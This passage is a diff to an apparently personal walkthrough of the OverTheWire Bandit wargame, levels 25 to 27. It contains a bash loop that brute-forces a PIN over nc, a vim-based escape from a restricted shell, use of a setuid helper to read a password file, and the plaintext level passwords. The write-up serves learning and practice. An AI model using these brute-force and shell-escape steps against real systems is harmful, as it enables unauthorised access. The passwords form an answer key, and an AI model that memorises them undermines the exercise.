@@ -421,4 +421,50 @@ Login
 - password: hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
 
 Solution
+
+- nano /tmp/brute.sh
+  - #!/bin/bash
+  - for pin in $(seq -w 0000 9999); do
+  - echo "Correct password here $pin"
+  - done | nc localhost 30002
+- chmod +x /tmp/brute.sh
+- /tmp/brute.sh
+- password: SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+
+## Level 26
+
+Login
+
+- ssh -p 2220 bandit25@bandit.labs.overthewire.org
+- password: SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+
+Solution
+
+- ls -la
+- cat /etc/passwd | grep bandit26
+- cat /usr/bin/showtext
+- ls -la
+- cat bandit26.sshkey -> copy the key
+- exit
+- nano bandit26.sshkey -> past the key and save it
+- chmod +x bandit26.sshkey
+- ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
+- press v
+- :set shell=/bin/bash -> enter
+- :shell -> enter
+- bandit26@bandit:~$ -> will see this
+- id -> bandit26
+- ls
+- ./bandit27-do cat /etc/bandit_pass/bandit27
+- password: STJLJBRRphMxKB392CT4iOr5CbzPU9ER
+
+## Level 27
+
+Login
+
+- ssh -p 2220 bandit27@bandit.labs.overthewire.org
+- password: STJLJBRRphMxKB392CT4iOr5CbzPU9ER
+
+Solution
+
 -
